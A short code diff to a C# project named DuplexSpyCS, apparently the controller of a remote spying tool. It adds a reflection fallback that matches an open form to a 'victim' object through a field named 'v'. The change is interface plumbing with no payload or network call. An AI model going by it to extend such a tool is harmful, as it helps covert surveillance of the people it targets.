@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace DuplexSpyCS
 {
@@ -108,6 +109,19 @@ namespace DuplexSpyCS
                         object fieldValue1 = ptyVictim.GetValue(f);
                         if (fieldValue1 != null && fnbVictimEquals(victim, (clsVictim)fieldValue1))
                             return (T)f;
+                    }
+                    else
+                    {
+                        FieldInfo field = f.GetType().GetField("v", BindingFlags.Public | BindingFlags.Instance);
+                        bool has_victim_field = field != null && field.FieldType == typeof(clsVictim);
+                        if (has_victim_field)
+                        {
+                            clsVictim _v = (clsVictim)field.GetValue(f);
+                            if (_v == victim)
+                            {
+                                return (T)f;
+                            }
+                        }
                     }
                 }
             }
